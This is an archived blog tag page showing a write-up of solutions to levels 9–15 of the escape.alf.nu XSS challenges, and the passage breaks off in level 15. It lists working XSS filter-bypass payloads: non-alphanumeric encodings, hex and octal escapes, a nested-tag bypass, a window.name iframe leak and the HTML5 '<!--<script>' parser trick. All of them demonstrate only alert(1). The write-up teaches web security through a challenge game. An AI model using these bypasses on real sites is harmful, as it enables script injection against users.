@@ -1,0 +1,824 @@
+
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>JavaScript - Page 1 - &lt;/pwntester&gt;</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">
+
+    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
+    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+
+    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
+    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>
+
+
+    <link rel="canonical" href="http://www.pwntester.com/tag/javascript/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="&lt;/pwntester&gt;">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="JavaScript - Page 1 - &lt;/pwntester&gt;">
+    <meta property="og:url" content="http://www.pwntester.com/tag/javascript/">
+    <meta property="article:modified_time" content="2014-05-04T16:31:52.000Z">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="JavaScript - Page 1 - &lt;/pwntester&gt;">
+    <meta name="twitter:url" content="http://www.pwntester.com/tag/javascript/">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Series",
+    "publisher": {
+        "@type": "Organization",
+        "name": "&lt;/pwntester&gt;",
+        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
+    },
+    "url": "http://www.pwntester.com/tag/javascript/",
+    "name": "JavaScript",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://www.pwntester.com"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 0.11">
+    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">
+
+    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">
+
+    <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-49973078-2', 'pwntester.com');
+  ga('send', 'pageview');
+
+</script></head>
+
+<body class="tag-template tag-javascript">
+
+    <div id="sidebar">
+        <div id="sidebar-content" class="inner">
+            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
+            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
+            <h3 class="blog-description"></h3></h2>
+
+            <!--form id="search">
+                <input id="search-field" placeholder="Search"/>
+            </form-->
+            <form id="search">  
+                <input id="search-field" type="search" placeholder="Search">
+            </form>  
+
+            <div id="sidebar-links">
+                <ul id="subscription-links">
+                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
+                    <!-- No support yet
+                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
+                    -->
+                </ul>
+                <ul id="sidebar-internal">
+                    <!-- For 'About' and other pages -->
+                </ul>
+                <ul id="sidebar-external">
+                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
+<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
+<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
+<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
+                </ul>
+            </div>
+
+            <footer class="site-footer">
+                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
+            </footer>
+        </div>
+    </div>
+
+    <main>
+        <section id="results"></section>
+        
+
+<header class="tag-archive-header">
+    <h4><i class="fa fa-tag"></i><span class="tag-archive-header-name">JavaScript</span></h4>
+</header>
+
+
+<article class="post tag-xss tag-javascript">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-01-08">08 Jan 2014</time> on <a href="../xss/">XSS</a>, <a href="index.html">JavaScript</a></span>
+        <h2 class="post-title"><a href="../../blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/">escape.alf.nu XSS Challenges Write-ups (Part 2)</a></h2>
+
+    </header>
+    <section class="post-content">
+        <p>These are my solutions to <a href="https://twitter.com/steike">Erling Ellingsen</a> <a href="http://escape.alf.nu">escape.alf.nu XSS challenges</a>. I found them very interesting and I learnt a lot from them (especially from the last ones published in this post). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.</p>
+
+<p>My suggestion, if you havent done it so far, is to go and try to solve them by yourselves.... so come on, dont be lazy, stop reading here and give them a try</p>
+
+<p>...</p>
+
+<p>...</p>
+
+<p>...</p>
+
+<p>...</p>
+
+<p>...</p>
+
+<p>Ok so if you have already solve them or need some hints, here are my solutions</p>
+
+<h1 id="level9">Level 9:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // This is sort of a spoiler for the last level :-)
+
+  if (/[\\&lt;&gt;]/.test(s)) return '-';
+
+  return '&lt;script&gt;console.log("' + s.toUpperCase() + '")&lt;/script&gt;';
+}
+</code></pre>
+
+<p>Some as level 8 but now we cannot use angle brackets (&lt;&gt;) nor backslashes (\)</p>
+
+<p>Solutions:</p>
+
+<p>Is it possible to use an online non-alphanumeric encoder to encode the following payload so it uses no alpha characters, angle brackets (&lt;&gt;) nor backslashes (\)</p>
+
+<pre><code class="language-lang-javascript line-numbers ">"+alert(1))//
+</code></pre>
+
+<p>Producing a huge solution (5627):</p>
+
+<pre><code class="language-lang-javascript line-numbers ">"+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+(+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))())//
+</code></pre>
+
+<p>We can also try to use our own minimization using the letters in "false", "true", "undefined" and "object":</p>
+
+<table style="border: 1px solid black;">  
+<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+!1</td><td style="border: 1px solid black;padding:15px;">false</td></tr>  
+<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+!0</td><td style="border: 1px solid black;padding:15px;">true</td></tr>  
+<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+{}[0]</td><td style="border: 1px solid black;padding:15px;">undefined</td></tr>  
+<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">''+{}</td><td style="border: 1px solid black;padding:15px;">[object Object]</td></tr>  
+</table>  
+
+<p><br></p>
+
+<p>Strings we will need:</p>
+
+<table style="border: 1px solid black;">  
+<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">sort</td><td style="border: 1px solid black;padding:15px;">[(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]]</td></tr>  
+<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">constructor</td><td style="border: 1px solid black;padding:15px;">[(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]</td></tr>  
+<tr style="border: 1px solid black;"><td style="border: 1px solid black;padding:15px;">alert(1)</td><td style="border: 1px solid black;padding:15px;">(''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+"(1)"</td></tr>  
+</table>  
+
+<p><br></p>
+
+<p>We will replace the call to <strong>alert(1)</strong> in our payload:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">"+alert(1))//
+</code></pre>
+
+<p>with the following one so we can simplify the encoding to encode strings.</p>
+
+<pre><code class="language-lang-javascript line-numbers ">"+[]["sort"]["constructor"]("alert(1)")()//
+</code></pre>
+
+<p>Note: Many other alternatives are possible like:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">"+(0)['constructor']['constructor']("alert(1)")()//
+</code></pre>
+
+<p>But I found the "sort" one to be the shortest (with other 4 letter functions like "trim")</p>
+
+<p>This is a 246 characters solution:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">"+[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+"(1)")())//
+</code></pre>
+
+<p>We can improve it by defining a variable containing all our letters and then just referencing it:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">_=''+!1+!0+{}[0]+{} = "falsetrueundefined[object Object]"  
+</code></pre>
+
+<pre><code class="language-lang-javascript line-numbers ">");_=''+!1+!0+{}[0]+{};[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//
+</code></pre>
+
+<p>Now the solution is 144 characters which is still far from the winners:</p>
+
+<p>Next iteratation is to change the base payload for something sorter like <strong>window.alert(1)</strong> <br>
+In chrome, we can leak a reference to window with:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">(0,[]["concat"])()[0]
+</code></pre>
+
+<p>So using the same strings as above we get the following 100 characters solution:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">");_=""+!1+!0+{}[0]+{};(0,[][_[23]+_[19]+_[10]+_[23]+_[1]+_[5]])()[0][_[1]+_[2]+_[4]+_[6]+_[5]](1)//
+</code></pre>
+
+<p>We are still taking too many chars for defining our alphabet. Here is where <a href="https://twitter.com/0x6D6172696F">Mario</a> surprised me once again with this tweet:</p>
+
+<p><img src="../../content/images/octopress/mariosolution.png" alt=""></p>
+
+<pre><code class="language-lang-javascript line-numbers ">");(_=!1+URL+!0,[][_[8]+_[11]+_[7]+_[8]+_[1]+_[9]])()[0][_[1]+_[2]+_[4]+_[38]+_[9]](1)//
+</code></pre>
+
+<p>Note that he is using <strong>!1+URL+!0</strong> as the alphabet string and it difers for different browsers:</p>
+
+<p>Firefox:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">_=!1+URL+!0="falsefunction URL() {  
+    [native code]
+}true"
+</code></pre>
+
+<p>Chrome:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">_=!1+URL+!0="falsefunction URL() { [native code] }true"  
+</code></pre>
+
+<p>Other interesting <a href="https://twitter.com/0x6D6172696F">Mario</a> 's finding is that inside with-statements, almost everything leaks [object Window] for example:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">with(0) x=[].sort,x()  
+</code></pre>
+
+<p><img src="../../content/images/octopress/windowleak.png" alt=""></p>
+
+<h1 id="level10">Level 10:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  function htmlEscape(s) {
+    return s.replace(/./g, function(x) {
+       return { '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '&amp;': '&amp;amp;', '"': '&amp;quot;', "'": '&amp;#39;' }[x] || x;
+     });
+  }
+
+  function expandTemplate(template, args) {
+    return template.replace(
+        /{(\w+)}/g,
+        function(_, n) {
+           return htmlEscape(args[n]);
+         });
+  }
+
+  return expandTemplate(
+    "                                                \n\
+      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\
+      &lt;script&gt;                                       \n\
+         var v = document.getElementById('name');    \n\
+         v.innerHTML = '&lt;a href=#&gt;{name}&lt;/a&gt;';       \n\
+      &lt;\/script&gt;                                     \n\
+    ",
+    { name : s }
+  );
+}
+</code></pre>
+
+<p>Injection takes place in a JS string context and since "\" is not escaped in the htmlEscape function, we can use hex or octal encoding for the "&lt;" symbol and bypass the escaping function.</p>
+
+<p>Valid solutions:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">\x3csvg onload=alert(1)
+</code></pre>
+
+<pre><code class="language-lang-javascript line-numbers ">\74svg onload=alert(1)
+</code></pre>
+
+<h1 id="level11"> Level 11:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Spoiler for level 2
+  s = JSON.stringify(s).replace(/&lt;\/script/gi, '');
+
+  return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';
+}
+</code></pre>
+
+<p>I've seen similar escaping functions in real applications, normally it is not a good idea to fix the input data, you either accept it or reject it but trying to fix it normally leads to bypasses. In this case the escape function replaces "&lt;/script" with an empty string so shortest solution is:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;/&lt;/scriptscript&gt;&lt;script&gt;alert(1)//  
+</code></pre>
+
+<h1 id="level12">Level 12:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  // Pass inn "callback#userdata"
+  var thing = s.split(/#/);
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/\//g, '\\/');
+  return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";
+}
+</code></pre>
+
+<p>Similar to level 7 but this time the backslash is also escaped so we use a similar vector with a different way to comment the junk out:</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">'#';alert(1)&lt;!--  
+</code></pre>
+
+<p>It will render:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;'({"userdata":"';alert(1)&lt;!--"})&lt;/script&gt;  
+</code></pre>
+
+<h1 id="level13">Level 13:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  var tag = document.createElement('iframe');
+
+  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
+  //
+  // http://print.alf.nu/?text=... just outputs whatever you pass in.
+  //
+  // Alerting from print.alf.nu won't count; try to trigger the one below.
+
+  s = '&lt;script&gt;' + s + '&lt;\/script&gt;';
+  tag.src = 'http://print.alf.nu/?html=' + encodeURIComponent(s);
+
+  window.WINNING = function() { youWon = true; };
+
+  tag.onload = function() {
+    if (youWon) alert(1);
+  };
+  document.body.appendChild(tag);
+}
+</code></pre>
+
+<p>Iframes have a interesting feature: setting the <strong>name</strong> attribute on an iframe sets the <strong>name</strong> property of the iframe's global window object to the value of that string. Now, the interesting part is that it can be done the other way around, so an iframe can define its own <strong>window.name</strong> and the new name will be injected in the parent's global window object if it does not exist already (it cannot overwrite it). <br>
+So if we fool the framed site to declare its window.name as "youWon", a <strong>youWon</strong> variable will be setted in the parent global window object and so the "alert(1)" will be popped</p>
+
+<p>Solution:  </p>
+
+<pre><code class="language-lang-javascript line-numbers ">name='youWon'  
+</code></pre>
+
+<h1 id="level14">Level 14:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;!DOCTYPE HTML&gt;  
+function escape(s) {  
+  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
+  function html(s) { return s.replace(/[&lt;&gt;"&amp;]/g, function(s) {
+                        return '&amp;#' + s.charCodeAt(0) + ';'; }); }
+
+  return (
+    '&lt;script&gt;' +
+      'var url = ' + json(s) + '; // We\'ll use this later ' + '&lt;/script&gt;\n\n' +
+    '  &lt;!-- for debugging --&gt;\n' +
+    '  URL: ' + html(s) + '\n\n' +
+    '&lt;!-- then suddenly --&gt;\n' +
+    '&lt;script&gt;\n' +
+    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
+    '  else new Image().src = url;\n' +
+    '&lt;/script&gt;'
+  );
+}
+</code></pre>
+
+<p>In order to solve this level we need to be familiar with an HTML5 parser "feature" when dealing with comments in JS blocks. This feature is well described in this <a href="https://communities.coverity.com/blogs/security/2012/11/16/did-i-do-that-html-5-js-escapers-3">post</a> (thanks for the hint <a href="https://twitter.com/cgvwzq">@cgvwzq</a>!).</p>
+
+<p>The trick is that injecting an <a href="http://javascript.spec.whatwg.org/#comment-syntax">HTML5 single line comment</a> "&lt;!--" followed by a "&lt;script&gt;" open tag will move the parser into the "script data double escaped state" until the closing script tag is found and then it will transition into "<strong>script data escaped state</strong>" and it will treat anything from the end of the string where we injected the "&lt;!--&lt;script&gt;" as JS! only thing we need to do is making sure there is a "--&gt;" so that the parser does not throw an invalid syntax exception.</p>
+
+<p>So basically, if there is a "--&gt;" somewhere in the code (or we can inject it) we can fool the parser into processing HTML as JS. The string where we inject "&lt;!--&lt;script&gt;" will still be considered as a JS string an everything following the string will become JS.</p>
+
+<p>For this level we will make the JS engine to parse the HTML part (URL: xxx). In order to do so, we will start our payload with "alert(1)" so that the first JS evaluated will be "URL: alert(1)" then we want to comment out the remaining JS code so we will insert a multi-line comment start "/<em>". This way everything else will be commented out until we reach the "</em>/" present in the regexp; the code from that point on will be evaluated. In order to get a valid regexp we will also inject "if(/a/" before the multi-line comment start. So our payload will look like:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">alert(1);/*&lt;!--&lt;script&gt;*/if(/a//*  
+</code></pre>
+
+<p>The resulting code will be:</p>
+
+<p><img src="../../content/images/octopress/xsslevel14.png" alt=""></p>
+
+<p>Now if we clean it up and remove the comments (in grey):</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;  
+  var url = "alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*";
+  URL: alert(1); if(/a/.test(url)) console.log("Bad url: " + url);
+  else new Image().src = url;
+&lt;/script&gt;  
+</code></pre>
+
+<p>We can get it even shorter with:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">if(alert(1)/*&lt;!--&lt;script&gt;  
+</code></pre>
+
+<p>This will turn into:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;  
+  var url = "alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*";
+  URL: if(alert(1).test(url)) console.log("Bad url: " + url);
+  else new Image().src = url;
+&lt;/script&gt;  
+</code></pre>
+
+<h1 id="level15">Level 15:</h1>
+
+<pre><code class="language-lang-javascript line-numbers ">function escape(s) {  
+  return s.split('#').map(function(v) {
+      // Only 20% of slashes are end tags; save 1.2% of total
+      // bytes by only escaping those.
+      var json = JSON.stringify(v).replace(/&lt;\//g, '&lt;\\/');
+      return '&lt;script&gt;console.log('+json+')&lt;/script&gt;';
+      }).join('');
+}
+</code></pre>
+
+<p>We can use the same trick we used for level 14. We can start with something simple like:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">payload1#payload2  
+</code></pre>
+
+<p>that will render:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;script&gt;console.log("payload1")&lt;/script&gt;&lt;script&gt;console.log("payload2")&lt;/script&gt;  
+</code></pre>
+
+<p>We can take advantage of HTML5 "&lt;!--&lt;script&gt;" trick to change the way the parser treats the code between the two blocks and inject our "alert(1)" payload. <br>
+Note that this trick only works in HTML5 documents and we will need to inject a closing "--&gt;" since it is not present in the code</p>
+
+<p>The solution is:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;  
+</code></pre>
+
+<p>This will render:</p>
+
+<p><img src="../../content/images/octopress/xsslevel15-1.png" alt=""></p>
+
+<p>Since we transition to "<strong>script data double escaped state</strong>" when the parser finds "&lt;!--&lt;script&gt;", the JS engine will receive the following valid JS expression:</p>
+
+<p><img src="../../content/images/octopress/xsslevel15-2.png" alt=""></p>
+
+<p>That can be interpreted as:</p>
+
+<pre><code class="language-lang-javascript line-numbers ">console.log("junk_string") &lt; /junk_regexp/ ; alert(1) // --&gt;  
+</code></pre>
+
+<p>Where:</p>
+
+<ul>
+<li>junk_string: &lt;!--&lt;script&gt;</li>
